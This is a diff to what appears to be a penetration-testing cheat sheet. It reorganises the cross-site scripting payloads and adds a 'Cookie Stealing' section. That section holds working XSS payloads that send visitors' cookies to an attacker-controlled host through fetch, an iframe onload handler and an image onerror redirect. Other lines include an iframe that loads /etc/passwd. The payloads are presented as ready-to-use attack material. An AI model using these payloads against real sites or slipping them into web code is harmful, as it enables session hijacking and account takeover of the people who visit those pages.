@@ -4239,16 +4239,25 @@ $ xsrfprobe -u https://<RHOST> --crawl --display
 
 aka JavaScript Injection.
 
+### Common Payloads
+
 ```c
 <sCrIpt>alert(1)</ScRipt>
 <script>alert('XSS');</script>
-<script>alert(document.cookies)</script>
-<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
-<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
 <script>user.changeEmail('user@domain');</script>
 </script><svg/onload=alert(0)>
-<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
 <img src='http://<RHOST>'/>
+<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
+<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
+```
+
+### Cookie Stealing
+
+```c
+<script>alert(document.cookies)</script>
+<iframe onload="fetch('http://<LHOST>/?c='+document.cookie)">
+<img src=x onerror="location.href='http://<LHOST>/?c='+ document.cookie">
+<script>fetch('https://<LHOST>/steal?cookie=' + btoa(document.cookie));</script>
 ```
 
 ### Reflected XSS
